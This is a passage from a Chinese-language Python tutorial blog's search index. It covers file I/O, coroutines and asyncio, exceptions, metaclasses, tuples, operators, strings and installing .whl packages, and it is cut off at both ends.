我们通过对程序的优化，现在这个程序我测试的使用时间已经缩短到1秒了。可以很明显的发现程序优化前和优化后的差别是巨大的。我们写程序时不仅仅要解决问题，还要想办法更好的解决问题。多多学习优秀的算法，多多对自己的程序进行思考，这是每一个程序员的必备技能。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%9D%A1%E4%BB%B6%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/","title":"Python学习之路——条件控制语句"},{"content":"Python 学习之路——文件 文件在作为计算机的重要组成部分，程序本质上也是文件。很多时候我们需要将数据保存到本地，这个时候就需要对文件进行操作。\n一、打开文件 在Python中，我们利用open()函数来打开一个文件。\n1 open(file, mode=\u0026#39;r\u0026#39;, buffering=None, encoding=None, errors=None, newline=None, closefd=True) file：文件路径\u0026quot; encoding：读取文件的编码格式，默认为\u0026quot;UTF-8\u0026quot; buffering: 设置缓冲 mode：打开文件的模式 errors: 报错级别 newline: 区分换行符 closefd: 传入的file参数类型 opener：自定义开启器 文件路径分为绝对路径和相对路径： 相对路径：如果目标文件和当前文件在同一级目录下，则直接使用文件名即可打开 绝对路径：从根目录开始书写，每一级直接用\u0026quot;/\u0026ldquo;隔开\n打开文件的模式：\nt 文本模式 (默认) x 写模式（新建一个文件，如果该文件已存在则会报错 ） b 二进制模式 + 打开一个文件进行更新(可读可写) r 以只读方式打开文件，文件的指针在文件的开头（默认） rb 以二进制格式打开一个文件用于只读，文件指针在文件的开头（默认模式） r+ 打开一个文件用于读写，文件指针在文件的开头 rb+ 以二进制格式打开一个文件用于读写。文件指针在文件的开头 w 打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，原有内容会被删除。如果该文件不存在，创建新文件 wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，原有内容会被删除。如果该文件不存在，创建新文件 w+ 打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件 wb+ 以二进制格式打开一个文件用于读写。如果该文件存在则打开文件，并从开头开始编辑，原有内容会被删除。如果该文件不存在，创建新文件 a 打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入 ab 以二进制格式打开一个文件用于追加。如果该文件存在，文件指针将会放在文件的结尾。新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入 a+ 打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写 ab+ 以二进制格式打开一个文件用于追加。如果该文件存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写 open函数会返回一个对象，该对象代表当前打开的文件。 二、关闭文件 当文件操作完毕后应当关闭文件，如果不关闭文件则会一直占用系统内存资源。 利用close()方法关闭文件\n1 2 3 4 # 打开文件 f = open(\u0026#39;python.txt\u0026#39;, \u0026#39;r\u0026#39;) # 关闭文件 f.close() 三、with语句 在Python中我们可以利用with语句打开文件。利用with语句打开文件，当文件操作完毕后自动关闭文件，不需要我们手动关闭，推荐在实际编写过程中使用with语句打开文件。\n1 2 3 4 5 6 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: pass # 和上述代码功能相同 f = open(\u0026#39;Python.txt\u0026#39;, \u0026#39;r\u0026#39;) f.close() 四、文件的读写 一般文件的读写 读取文件：先将文件打开模式设置为可读取，再利用read()方法进行读取文件内容。 read()方法在读取文件时会一次性读取文件的所有内容，将它放到缓冲区。 写入文件：先将文件打开模式设置为可写入，再利用write()方法进行读取文件内容。write()方法可以将字符串写入文件中，并返回写入字符串地长度。\n1 2 3 4 5 6 7 # 以读写模式打开文件 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;w+\u0026#39;) as f: # 写入文件 f.write(\u0026#39;Python\u0026#39;) # 读取文件 file = f.read() print(file) # Python 大型文件的读写 由于read()和write()会一次性读取和写入文件，当文件较大时如果选择一次性读写，那么很有可能会造成内存资源消耗完毕，长时间停留在此操作，导致程序出现崩溃。 为了解决这个问题，我们选择在读写文件时进行限流处理，限制每一次读写文件的数量，以此来避免出现内存占用完毕的现象。\n读取优化 设置size对read()方法限流： read()方法中可以接收一个size参数，这个参数代表了本次读取的文件的多少； 默认值为-1，代表读取整个文件； 当读取模式为文本模式时，size代表字符数量，当为二进制文件时，size代表字节数量。如果剩余数量小于size，那么则会将剩下的全部读取； read()方法每一次读取文件，都会从上一次读取结束位置开始。\n1 2 3 4 5 6 7 8 9 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: file = \u0026#34;\u0026#34; while True: # 每次读取十个字符 content = f.read(10) if not content: break file += content print(\u0026#39;文件读取完毕\u0026#39;) 使用readline()和readlinse()方法进行限流： readline()和readlines()方法读取文件时都是一行一行地读取文件。readlines()读取文件后会将读取到地文件封装到列表中返回。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: file = \u0026#34;\u0026#34; while True: # 每次读取十个字符 content = f.readline() if not content: break file += content # 效果一样 content = f.readlines() for i in content: file += i print(\u0026#39;文件读取完毕\u0026#39;) 写入优化 利用writelines()方法写入文件，该方法在写入字符串时会进行迭代操作，以换行符为分隔进行迭代。\n1 2 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.writelines(\u0026#39;P\\ny\\n\u0026#39;) # 内部写入时会分两次写入 文件指针操作 tell()：返回文件的当前位置\n1 2 3 4 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;w+\u0026#39;) as f: f.write(\u0026#39;1:Python\\n2:C++\u0026#39;) print(f.readline()) print(\u0026#39;当前位置:\u0026#39;, f.tell()) seek()：用于移动文件读取指针到指定位置 语法：fileObject.seek(offset[, whence]) offset: 开始的偏移量，也就是代表需要移动偏移的字节数 whence：可选，默认值为 0。给offset参数一个定义，表示要从哪个位置开始偏移；0代表从文件开头开始算起，1代表从当前位置开始算起，2代表从文件末尾算起。\n1 2 3 4 5 6 7 with open(\u0026#39;Python.txt\u0026#39;, \u0026#39;w+\u0026#39;) as f: f.write(\u0026#39;1:Python\\n2:C++\u0026#39;) a = f.readline() print(a) # 1:Python f.seek(10, 0) b = f.readline() print(b) # 1:Python 五、os模块 os 模块是Python地一个内置模块，它提供了非常丰富的方法用来处理文件和目录。 常用方法：\nlistdir() ：获取当前目录结构 chdir()：切换盘符 getcwd() ：获取当前所在的目录 mkdir()：创建目录 在当前目录创建 rmdir()：删除目录 open()：打开文件，设置打开选项，mode参数可选 remove()：删除指定路径的文件 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%96%87%E4%BB%B6/","title":"Python学习之路——文件"},{"content":"Python 学习之路——协程 一、协程 协程（Coroutine），又称微线程，纤程。 协程由多个子函数构成。执行过程中，在子函数内部可中断，然后转而执行别的子函数，在适当的时候再返回来接着执行子函数。\n二、生成器实现 子函数运行到一定程度时暂停，等待下一次启动 根据协程的特性我们不难发现我们的生成器函数就可以实现这个特性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import time import asyncio def Producer(generator): for i in range(1000): time.sleep(1) generator.send(i) def Consumer(): while True: a = yield print(a) if __name__ == \u0026#39;__main__\u0026#39;: s = Consumer() next(s) b = Producer(s) 在上面的代码里我们就利用生成器实现了一个简单的协程。因此在Python中的协程就是利用生成器实现的。\n三、asyncio库 1. async和await asyncio库是在Python 3.4版本引入的标准库，在这个库里直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。 我们之间从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。\n1 2 3 4 5 6 7 8 9 10 11 12 import asyncio @asyncio.coroutine # 把generator标记为coroutine类型 def hello(): print(\u0026#34;Hello world!\u0026#34;) yield from asyncio.sleep(1) # 调用另外一个generator print(\u0026#34;The end!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: loop = asyncio.get_event_loop() # 将协程添加进事件循环 loop.run_until_complete(hello()) # 运行事件循环 loop.close() 在Python3.5的版本中，开始引入了新的语法——async和await关键字。 这两个关键字的引入让coroutine语法更简洁，它们是针对coroutine的新语法，只需要把 @asyncio.coroutine替换为async、yield from替换为await 即可实现协程函数。\n1 2 3 4 5 6 7 8 9 10 11 import asyncio async def hello(): print(\u0026#34;Hello world!\u0026#34;) await asyncio.sleep(1) print(\u0026#34;The end!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: loop = asyncio.get_event_loop() loop.run_until_complete(hello()) loop.close() 2. 基本概念 可等待对象 如果一个对象可以在 await 语句中使用，那么它就是 可等待 对象。许多 asyncio API 都被设计为接受可等待对象。 可等待对象有三种主要类型：协程, 任务 和 Future.\nPython中的协程 Python 协程属于可等待 对象，因此可以在其他协程中被等待:\n协程函数: 定义形式为 async def 的函数; 协程对象: 调用 协程函数 所返回的对象。 运行协程 要真正运行一个协程，asyncio 提供了三种主要机制：\nasyncio.run() 函数用来运行最高层级的入口点 等待一个协程 asyncio.create_task() 函数用来并发运行作为 asyncio 任务的多个协程 3. asyncio详解 在asyncio库中分为高级API和底层API： 高层级API：\n并发地运行Python协程并完全控制其执行过程； 执行网络IO和IPC； 控制子进程； 通过队列实现分布式任务； 同步并发代码。 低层级API：\n用以支持开发异步库和框架 创建和管理事件循环（event loop），提供异步的API用于网络，- 运行子进程，处理操作系统信号等； 通过transports实现高效率协议； 通过async/await 语法桥架基于回调的库和代码。 高级API 官方文档\n低级API 官方文档\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%8D%8F%E7%A8%8B/","title":"Python学习之路——协程"},{"content":"Python 学习之路——异常 一、简介 什么是异常？ 在我们编写Python程序的过程中，常常会因为各种原因导致我们的程序出现错误，这就是程序出现异常。 由于在Python程序中，程序一旦出现异常，那么整个程序会立即终止，异常后面的代码都不会执行（异常前面的代码会执行，在这里也体现出Python是编译性语言的特征）。\n什么是处理异常？ 为了不让我们的程序一旦出现出现异常就卡死，我们就需要对程序中可能出现异常的部分进行处理。 当在函数中出现异常时，如果在函数中对异常进行了处理，则异常不会再传播，如果函数中没有对异常进行处理，则异常会继续向函数调用处传播。 如果函数在调用处处理了异常，则不再传播； 如果没有处理则继续像调用处传播，直到传递到全局作用域，如果依然没有处理，则程序终止，并且显示异常信息。\n二、异常的分类 当程序运行过程中出现异常以后，所有的异常信息会被专门保存到一个异常对象当中 而异常传播时，实际上就是异常对象抛给了调用处。 常见异常：\n异常名 出现原因 BaseException 所有异常的基类 Exception 常规异常的基类 AttributeError 对象不存在此属性 IndexError 输入/输出操作失败 KeyboardInterrupt 用户中断执行 KeyError 映射中不存在此键 NameError 找不到名字（变量） SyntaxError Python语法错误 TypeError 对类型无效的操作 ValueError 传入无效的参数 ZeroDivisionError 除或取模运算的第二个参数为0 ConnectionError 与连接相关异常的基类 三、异常的处理 在Python中我们可以利用try-except语句来对异常进行处理。 异常处理语法：\n1 2 3 4 5 6 7 8 9 10 11 try: 代码块(可能会出现错误的语句) except 异常类型 as异常名： 代码块(出现错误以后的处理方式) except 异常类型 as异常名： 代码块(出现错误以后的处理方式) ..... else: 代码块(没有错误时要执行的语句) finally: 代码块(是否有异常都会执行) 在try-eccept语句中，如果except后面不跟任何内容，则此时会捕获到所有的异常；如果except后面跟着一个异常类型，那么此时它只会捕获该类型的异常。\n1 2 3 4 try: print(1/0) except ZeroDivisionError: print(\u0026#39;出现错误！\u0026#39;) 当直接运行\u0026quot;1/0\u0026quot;时，程序会抛出ZeroDivisionError异常。我们利用try-except语句接收异常，然后执行print(\u0026lsquo;出现错误！\u0026rsquo;)语句，然后就不会抛出异常了，后面的程序也不会中断了。\n四、自定义异常对象 在实际开发过程中，我们可以自己自定义异常对象，在程序不能按照我们的要求执行时就抛出自定义异常。 自定义异常语法：\n1 raise [Exception [, args [, traceback]]] 语句中Exception是异常的类型（例如，NameError）。该参数是可选的，如果不提供，异常的参数是\u0026quot;None\u0026quot;。\n1 2 3 4 5 6 7 8 9 10 class MyError(Exception): pass def add(a,b): if a \u0026lt; 0 or b \u0026lt; 0 : raise MyError(\u0026#39;输入值不应为负！\u0026#39;) r = a + b return r print(add(-1,2)) MyError是我们定义的异常，当程序不符合我们的要求时就抛出MyError异常。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%BC%82%E5%B8%B8/","title":"Python学习之路——异常"},{"content":"Python 学习之路——元类 一、什么是元类？ 在Python中，一切皆对象。 众所周知，实例化对象是由类创建的。那么类是不是对象？它又是由什么创建的呢？ 答案是肯定的，类也是一个对象，类是由元类创建的。\n1 2 3 4 5 6 class A(): pass print(type(A)) # \u0026lt;class \u0026#39;type\u0026#39;\u0026gt; print(isinstance(A, type)) # True 通过代码我们可以发现，类的类居然是 type。 在我们以往的认知中，我们只知道可以用 type() 函数来查看对象的类。没想到 type 也是一种类，还是最顶端的元类。\n二、动态创建类 1. 自定义函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def createClass(name): if name == \u0026#39;teacher\u0026#39;: class User(object): def __str__(self): return \u0026#34;teacher\u0026#34; return User elif name == \u0026#39;student\u0026#39;: class Student: def __str__(self): return \u0026#34;student\u0026#34; return Student User = createClass(\u0026#39;teacher\u0026#39;) a = User() print(str(a)) # teacher 在上面的代码中，我们自定义了一个创建的类的函数，通过检测传入的字符串来创建对应的类。因为类也是对象，所以可以通过函数返回，然后再实例化创建对象。\n2. type()函数 在上面的代码中，我们虽然实现了动态创建类，但是局限性很大，而且也十分不方便，那个我们还有什么更好的方法吗？ 当然有！那就是用我们强大的 type() 函数。 我们通过查看 type() 函数的源码可以看到下面一段注释：\n1 2 3 4 5 \u0026#34;\u0026#34;\u0026#34; type(object_or_name, bases, dict) type(object) -\u0026gt; the object\u0026#39;s type type(name, bases, dict) -\u0026gt; a new type \u0026#34;\u0026#34;\u0026#34; 我们平时用的就是它的第二种用法——传入一个实例对象返回对象的类型。现在创建类的话我们就要用 type() 函数的其它用法了。 首先我们先了解一下type() 函数各个参数：\nname：需要创建的类的名称，类型为字符串 bases：需要继承的父类，类型为元组 dict：需要给类添加的方法和属性，类型为字典\n知道了各个参数的用法后我们就可以动态的创建类了。\n1 2 3 4 5 6 7 8 def speak(self): print(self.name) Student = type(\u0026#39;Student\u0026#39;, (), {\u0026#39;name\u0026#39;:\u0026#39;Python\u0026#39;, \u0026#39;speak\u0026#39;:speak}) print(type(Student)) # \u0026lt;class \u0026#39;type\u0026#39;\u0026gt; student = Student() student.speak() # Python print(type(student)) # \u0026lt;class \u0026#39;__main__.Student\u0026#39;\u0026gt; 我们可以发现我们成功地利用 type() 函数创建了一个类，并且成功地实例化了。说明利用 type() 方法动态创建类是可行地。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%85%83%E7%B1%BB/","title":"Python学习之路——元类"},{"content":"Python 学习之路——元组(tuple) 元组是Python序列中一种不可变序列。当我们希望数据不变的时候我们就用元组，其余情况都用列表。\n一、创建元组 1 2 3 4 5 6 7 8 9 # 方式一 tup1 = (\u0026#34;1\u0026#34;,) # 方式二 tup2 = \u0026#34;1\u0026#34;, # 注意要有逗号 # 方式三 tup3 = tuple() # 在tuple()中可传递一个可迭代对象，如果不传参数则生成一个空元组 # 实例： tup4 = tuple(\u0026#34;123\u0026#34;) # tup4 = (\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;) 二、访问元组的值 1. 通过索引访问 元组作为Python序列结构的一种，可以通过访问索引值进行访问元组。元组的索引值从0开始。\n1 2 tup = tuple(\u0026#34;Python\u0026#34;) print(tup[0]) # \u0026#34;P\u0026#34; 当访问的索引值超过元组的最大索引值时就会抛出异常\n1 2 3 tup = tuple(\u0026#34;Python\u0026#34;) print(tup[6]) # IndexError: tuple index out of range 2. 切片操作 列表可以进行切片截取操作。\n1 2 3 4 5 tup = tuple(\u0026#34;Python\u0026#34;) print(tup[1:5:3]) # [\u0026#39;y\u0026#39;, \u0026#39;o\u0026#39;] # list[start:end:step] # 进行切片操作时可以传递三个值，分别是开始索引，结束索引和步长 # 开始索引默认为0，结束索引默认为最大索引值，步长默认为1 三、元组的特殊操作 1. 元组的拼接 元组虽然无法直接对元组内的对象进行删增操作，但是可以通过元组之间相加的方式进行增添。\n1 2 3 4 5 6 7 8 9 10 11 tup1 = (1,2) tup2 = (3,4) # \u0026#34;+\u0026#34; 可以将两个列表进行首尾相接 tup3 = tup1+tup2 # tup3 = (1, 2, 3, 4) # 魔术方法 面向对象 tup3 = tup2.__add__(tup1) # tup3 = (1, 2, 3, 4) # \u0026#34;*\u0026#34; 可以让一个列表元素进行重复 tup3 = tup1*2 # tup3 = (1, 2, 1, 2) # 魔术方法 面向对象 tup3 = tup1.__imul__(2) # tup3 = (1, 2, 1, 2) 2. 判断元素是否在元组内部 1 2 tup = tuple(\u0026#34;Python\u0026#34;) \u0026#34;P\u0026#34; in tup # True 3. 元组的遍历 元组作为一种可迭代对象，是可以利用for进行遍历的\n1 2 3 4 5 6 7 8 9 tup = tuple(\u0026#34;Python\u0026#34;) for i in tup: print(i) # P # y # t # h # o # n 4. 元组的解包 元组有着一个特殊的使用方法——解包。 解包，顾名思义就是将打包的元组解开，将元组当中每一个元素都赋值给一个变量。\n1）全部提取 在对一个元组进行全部解包时，变量的数量要和元组中元素保持一致。\n1 a, b, c = (1, 2, 3) # a = 1, b = 2, c = 3 2）部分提取 当我们只想取出元组中的部分参数时，我们可以在变量前面添加一个 *，元组中的其他值将会以列表的形式赋值给加了 * 的这个参数。\n1 2 3 4 tup = tuple(\u0026#34;Python\u0026#34;) *a, b, c = tup # a = [\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;], b = \u0026#39;o\u0026#39;, c = \u0026#39;n\u0026#39; a, *b, c = tup # a = \u0026#39;P\u0026#39;, b = [\u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;], c =\u0026#39;n\u0026#39; a, b, *c = tup # a = \u0026#39;P\u0026#39;, b = \u0026#39;y\u0026#39;, c = [\u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;] 四、元组常用函数 1.求取元组长度(len) 1 2 3 4 5 tup = (1, 2, 3) # len()函数 len(tup) # 3 # 魔法方法 面向对象 tup.__len__() # 3 2.求取元组元素的最值(max,min) 1 2 3 4 5 tup = (1, 2, 3) # max()函数求取列表元素的最大值 max(tup) # 3 # min()函数求取列表元素的最小值 min(tup) # 1 3. 对元组里的元素排序(sorted) 1 2 3 tup = (1, 2, 3, 6, 4, 5) # sorted()函数可对可迭代对象进行排序，并返回一个列表 sorted(lis) # [1, 2, 3, 4, 5, 6] 4. 对元组进行反转(reversed) 1 2 3 4 5 6 7 tup = (1, 2, 3) # reversed()函数可以对可迭代对象进行排序，并返回一个迭代器 for i in reversed(tup): print(i) # 3 # 2 # 1 五、元组常用方法 1. 统计某个元素在元组中出现的次数(count) 1 2 3 4 tup = (1, 2, 3, 3) # count()方法可以统计元素在元组中的出现次数，并返回次数 # 如果需要统计的元素不在元组则返回 0 而不会抛出异常 tup.count(3) # 2 2. 获取元组元素第一个匹配项的索引位置(index) 1 2 3 4 5 6 tup = (1, 2, 3) # index()方法可以从元组中找出某个值第一个匹配项的索引位置 tup.index(3) # 2 # 当查找元素不在列表时会抛出异常 tup.index(4) # ValueError: tuple.index(x): x not in tuple 六、== 与 is的区别 Python中每一个对象都是由值(value)、类型(type)和地址(id)组成。\n1. == 与 != 用 == 和 != 比较的时候比较的是对象的值\n1 2 3 a = [1,2,3] b = [1,2,3] a == b # True 2. is 与 is not 用 is 和 is not 比较的时候比较的是对象的地址\n1 2 3 a = [1,2,3] b = [1,2,3] a is b # False ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%85%83%E7%BB%84tuple/","title":"Python学习之路——元组（tuple）"},{"content":"Python 学习之路——运算符 一、运算符 m + n：得到m和n相加（有浮点型参与则结果为浮点型，字符串、列表、元组、集合也可使用） m - n：得到m和n相减的算数差（有浮点型参与则结果为浮点型） m * n：得到m与n（n必须为整型）相乘（有浮点型参与则结果为浮点型，字符串、列表、元组也可使用） m ** n：得到m的n次方幂（结果为整型） m / n：得到m和n相除的算数商（结果为浮点型） m // n：得到m和n相除的整数部分（结果为整型） m % n：得到m和n相除的余数部分（结果为整型） 二、赋值运算符 m = n：将n复制给m m += n：等价于m = m + n m -= n：等价于m = m - n m *= n：等价于m = m * n m **= n：等价于m = m ** n m /= n：等价于m = m / n m //= n：等价于m = m // n m %= n：等价于m = m % n 三、比较运算符 is not ：比较两个对象是否不是同一个对象 is ：比较两个对象是否是同一个对象（比较的是对象的id） \u0026gt; ：比较左侧值是否大于右侧值 \u0026gt;= ：比较左侧值是否大于或等于右侧值 \u0026lt; ：比较左侧值是否小于右侧值 \u0026lt;= ：比较左侧值是否小于或等于右侧值 == ：比较两个对象的值是否相等 != ：比较两个对象的值是否不相等 注意：当判断的的是字符串等对象时，会进行逐级比较；以字符串“aaa“和字符串”bbb“为例，判断时先对每一个字符串中的第一个元素进行比较，如果第一次判断为True，则再对每一个字符串的第二个元素进行比较，依次类推直到遇到False或者全部比较完成。如果遇到False则返回False，如果全部为True则返回True. 注：Python语言中支持连等式，例：10 \u0026lt; y \u0026lt; 20\n四、逻辑运算符 not 逻辑非：对符号右侧的值进行“非“运算 对于非布尔值，非运算会先将其转换为布尔值，然后在做取反运算； 0 None 空串还有一些其他表示空性的值会转换成False,剩下的都是True。 and 逻辑与：对符号两侧的值进行“与“运算 只有在两侧的值均为True的时候，才会返回True；只要有一个False就会返回False。 or 逻辑或：对符号两侧的值进行“或“运算 只有在两侧的值均为False的时候，才会返回False；只要有一个True就会返回True。\n五、非布尔值的与或运算 and 与运算：按照从左往右的顺序进行判断，如果遇到False则返回False，对后面的判别式不再进行判断。如果全部为True则返回最后一个。 or 或运算：按照从左往右的顺序进行判断，如果遇到True则返回判断为True的值，对后面的式子不再进行判断。如果全为False则返回最后一个。\n六、三元运算符 语法: 语句1 if 条件表达式 else 语句2 执行流程: 条件运算符在执行时，会先对条件表达式进行求值判断 如果判断结果为True 则会执行语句1，并返回执行结果 如果判断结果为False 则会执行语句2 ，并返回执行结果\n1 2 3 4 # 输出两个值中较大的一项 m = 10 n = 5 print(m if m\u0026gt;n else n) 七、运算符优先级 运算符（从低到高） 描述 lambda Lambda表达式 or 布尔“或” and 布尔“与” in，not in 成员测试 is，is not 同一性测试 \u0026lt;，\u0026lt;=，\u0026gt;，\u0026gt;=，!=，== 比较运算符 由于CSDN编辑器的原因没法在列表中显示按位或运算的符号 按位或 ^ 按位异或 \u0026amp; 按位与 \u0026laquo;，\u0026raquo; 移位 +，- 加法与减法 *，/，% 乘法、除法与取余 +x，-x 正负号 ~x 按位翻转 ** 指数 x[index] 下标 x[index:index] 寻址段 f(arguments\u0026hellip;) 函数调用 (experession,\u0026hellip;) 绑定或元组显示 [expression,\u0026hellip;] 列表显示 {key:datum,\u0026hellip;} 字典显示 \u0026rsquo;expression,\u0026hellip;' 字符串转换 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E8%BF%90%E7%AE%97%E7%AC%A6/","title":"Python学习之路——运算符"},{"content":"Python 学习之路——字符串 一、创建字符串 字符串是由数字、字母、下划线组成的一串字符。 在Python中可以用一对单引号或者一对双引号创建字符串类型对象。 长字符串：当需要保留保留字符串中的格式长字符串可以用三重引号表示，在长字符串中可以保留换行等格式。 注意：相同引号之间不能嵌套！\n二、特殊字符 转义字符 描述 (在行尾时) 续行符 \\ 反斜杠符号 ' 单引号 \u0026quot; 双引号 \\n 换行 \\a 响铃 \\b 退格(Backspace) \\e 转义 \\000 空 \\v 纵向制表符 \\t 横向制表符 \\r 回车 \\f 换页 \\oyy 八进制数，yy代表的字符，例如：\\o12代表换行 \\xyy 十六进制数，yy代表的字符，例如：\\x0a代表换行 \\other 其它的字符以普通格式输出 三、字符串常用操作 操作符 描述 + 字符串连接 * 重复输出字符串 [] 通过索引获取字符串中字符 [ : ] 截取字符串中的一部分 in 成员运算符 - 如果字符串中包含给定的字符返回 True not in 成员运算符 - 如果字符串中不包含给定的字符返回 True 四、字符串格式化输出 1.拼串操作 1 2 a = \u0026#39;I \u0026#39;+\u0026#39;Love \u0026#39;+\u0026#39;You\u0026#39; print(a) #I Love You 2.多参数输出 1 2 a = \u0026#39;Love\u0026#39; print(\u0026#39;I\u0026#39;,a,\u0026#39;You\u0026#39;) #I Love You 注：print()函数默认每输出一个值就会在打印一个空格，若想改变默认输出，就在print()函数里传递一个sep=的关键字参数。\n1 print(\u0026#39;I\u0026#39;,\u0026#39;Love\u0026#39;,\u0026#39;You\u0026#39;,sep=\u0026#34;,\u0026#34;) # I,Love,You 3.使用占位符输出 在创建字符串的时候可以在字符串中指定占位符，然后格式化字符串输出。\n1 2 3 4 5 6 # 单参数 a = \u0026#39;Love\u0026#39; print(\u0026#39;I %s You\u0026#39;%a) #I Love You # 多参数 b = \u0026#39;You\u0026#39; print(\u0026#39;I %s %s\u0026#39;%(a,b)) #I Love You 常用占位符：\n符 号 描述 %c 格式化字符及其ASCII码 %s 格式化字符串 %d 格式化整数 %f 格式化浮点数字，可指定小数点后的精度 4.利用{}输出 1 2 a = \u0026#39;Love\u0026#39; print(f\u0026#39;I {a} You\u0026#39;) #I Love You 注意：字符串前面要加f！ 在字符串前加u：后面字符串以 Unicode 格式进行编码 在字符串前加f：在字符串内支持大括号内的python 表达式 在字符串前加b：让后面字符串是bytes 类型 在字符串前加r：去掉反斜杠的转移机制。\n5.str.format()方法 该方法基本语法是通过 {} 和 : 来代替以前的 % 。 format 函数可以接受不限个参数，位置可以不按顺序\n1 2 3 4 5 a = \u0026#39;I\u0026#39; b = \u0026#39;Love\u0026#39; c = \u0026#39;You\u0026#39; print(\u0026#39;{} {} {}\u0026#39;.format(a,b,c)) #I Love You print(\u0026#39;{2} {1} {0}\u0026#39;.format(c,b,a)) #I Love You 五、字符串其他常用方法 方法 描述 str.capitalize() 把字符串的第一个字符大写 str.count(str,beg=,end=) 返回 str 在 str 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数 str.decode(encoding=,errors=) 以 encoding 指定的编码格式解码 str，如果出错默认报一个 ValueError 的 异 常 ， 除非 errors 指 定 的 是 \u0026lsquo;ignore\u0026rsquo; 或 者\u0026rsquo;replace\u0026rsquo; str.encode(encoding=, errors=) 以 encoding 指定的编码格式编码 str，如果出错默认报一个ValueError 的异常，除非 errors 指定的是\u0026rsquo;ignore\u0026rsquo;或者\u0026rsquo;replace' str.find(str, beg=, end=) 检测 str 是否包含在 str 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1 str.join() 以 str 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串 str.lower() 转换 str 中所有大写字符为小写. str.lstrip() 截掉 str 左边的空格 max(str) 返回字符串 str 中最大的字母 min(str) 返回字符串 str 中最小的字母 str.replace(str1, str2, num=) 把 str 中的 str1 替换成 str2,若num 指定，则替换不超过 num 次. str.rstrip() 删除 str 字符串末尾的空格 str.split(str=\u0026quot;\u0026quot;, num=) 以 str 为分隔符切片 str，如果 num 有指定值，则仅分隔 num+ 个子字符串 str.splitlines(keepends=) 按照行(\u0026rsquo;\\r\u0026rsquo;, \u0026lsquo;\\r\\n\u0026rsquo;, \\n\u0026rsquo;)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符 str.strip() 删除字符串(str)的头和尾的空格，以及位于头尾的\\n \\t str.swapcase() 翻转 str 中的大小写 str.upper() 转换 str 中的小写字母为大写 str.title() 将分隔的字符串分别进行首字母大写 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"Python学习之路——字符串"},{"content":"Python 利用whl文件安装外部模块 由于pip下载的时候容易遇墙而导致下载失败，这个时候我们可以预先下载好whl包，用whl包进行安装。 whl后缀的压缩包和普通的压缩包没什么区别，只是方便Python使用pip方式安装。\n下面安装环境为win10，Python版本3.7 首先把whl文件放到D:\\python3.7\\Lib\\site-packages下，然后切换盘符到当前文件夹，然后输入 pip install 安装包名字.whl 当出现Sucessfully时则表明安装成功。\n安装时的一个小技巧：输入安装包的首字母再按Tab键文件名就会自动补全 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E7%94%A8whl%E6%96%87%E4%BB%B6%E5%AE%89%E8%A3%85%E5%A4%96%E9%83%A8%E6%A8%A1%E5%9D%97/","title":"Python用whl文件安装外部模块"},{"content":"QQ 音乐 P2P 